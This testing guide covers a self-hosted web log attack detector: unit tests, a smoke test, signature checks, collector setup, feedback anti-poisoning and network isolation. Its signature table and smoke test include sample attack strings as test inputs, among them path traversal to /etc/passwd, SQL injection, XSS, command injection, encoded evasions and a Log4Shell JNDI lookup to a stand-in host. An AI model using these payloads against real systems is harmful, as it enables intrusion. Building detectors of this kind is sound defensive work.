# Testing guide

Automated tests cover the parser, signatures, personal rules, the ingest
service and the dashboard. The manual checks below cover what automation
cannot: the collector, the Docker network isolation and a real deployment.

## 1. Automated tests

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt -r requirements-dev.txt
python -m pytest -q
```

All tests must pass. They run against temporary directories and do not touch
`alerts.db`, `model.joblib` or `personal_rules.json`.

## 2. End-to-end smoke test (no real logs)

```bash
./install.sh
docker compose exec ingest python -c "
import json, urllib.request
lines = [{'log': '10.0.0.5 - - [26/Oct/2026:10:00:01 +0000] \"GET /../../../../etc/passwd HTTP/1.1\" 403 256'}]
req = urllib.request.Request('http://localhost:8080/fluentbit', data=json.dumps(lines).encode(),
                             headers={'Content-Type': 'application/json'})
print(urllib.request.urlopen(req).read().decode())
"
```

Pass criteria:

- the response contains `"signature_matches": 1`
- after pressing Refresh, the entry appears under "Known attack signatures"
- it does not also appear under "To classify"

## 3. Signature layer

| Category | Sample | Expected |
|---|---|---|
| path_traversal | `GET /../../../../etc/passwd` | match |
| sql_injection | `?id=1 UNION SELECT user,pass FROM users` | match |
| xss | `?q=<script>alert(1)</script>` | match |
| command_injection | `?x=$(whoami)` | match |
| log4shell | `?x=${jndi:ldap://evil.example/a}` | match |
| webshell | `GET /uploads/c99.php` | match |
| scanner_tool | `User-Agent: sqlmap/1.7` | match |
| sensitive_path | `GET /.env` | match |
| benign | `GET /catalog?category=environment` | no match |

Evasions that must be caught: `%2e%2e%2f`, `%252e%252e%252f`, `UNI/**/ON SEL/**/ECT`.

Expected false positives: a page whose URL or title contains a literal attack
string (for example a blog post named "union select tutorial"). Classify it as
normal in the dashboard.

```bash
docker compose run --rm ingest python -c "
from signature_rules import match
print(match('your test line here'))
"
```

After editing `signature_rules.py`, run `docker compose restart ingest`.

## 4. Collector and real logs

1. Set `LOG_DIR` and `LOG_FILE` in `.env` to point at a real log file.
2. `docker compose --profile fluentbit up -d fluent-bit`
3. `docker compose logs fluent-bit | grep inotify_fs_add` shows your file.
4. Generate a request that was logged after the collector started and confirm
   a `POST /fluentbit` line appears in `docker compose logs ingest`.

Notes:

- The collector starts at the end of the file (`Read_from_Head false`), so
  lines written before it started are not sent. To replay existing content once,
  set `Read_from_Head true`, delete `fluent-bit-state/tail.db`, recreate the
  container, and set it back to `false` afterwards.
- If the file is not found, Fluent Bit starts without errors and sends nothing.
  Check the `inotify_fs_add` line.

## 5. Feedback loop and anti-poisoning

- [ ] Mark an item under "To classify" as Threat. It appears in
      `personal_rules.json`, and `personal_rules_audit.jsonl` gains an
      `add_true_positive_threat` entry with your name.
- [ ] Send the same line again. It is reported as a confirmed threat without
      restarting any service.
- [ ] Try to mark a near-identical line as Normal. The dashboard shows an error and the
      audit log records `rejected_conflict_false_positive`.
- [ ] Mark more than 20 items as Normal within an hour. The 21st is rejected.
- [ ] Try to mark a line shorter than 3 tokens as Normal. It is rejected.

## 6. Degraded operation

```bash
rm model.joblib && docker compose restart ingest
curl -s --max-time 3 http://127.0.0.1:8501 >/dev/null && echo dashboard-up
docker compose exec ingest python -c "import urllib.request;print(urllib.request.urlopen('http://localhost:8080/health').read().decode())"
```

Expected: `baseline_model_loaded` is `false`, the service stays healthy, and a
signature attack sent as in section 2 is still reported.

## 7. Network isolation

- From another machine, port 8080 is unreachable and port 8501 is unreachable
  (only `127.0.0.1` is bound).
- From inside the ingest container, an outbound request to the internet fails:

  ```bash
  docker compose exec ingest python -c "import urllib.request;urllib.request.urlopen('https://example.com', timeout=5)"
  ```

  This must raise an error.

## 8. Restart recovery

Restart the collector (`docker compose restart fluent-bit`). Previously read
lines must not be sent again; offsets are stored in `fluent-bit-state/tail.db`.
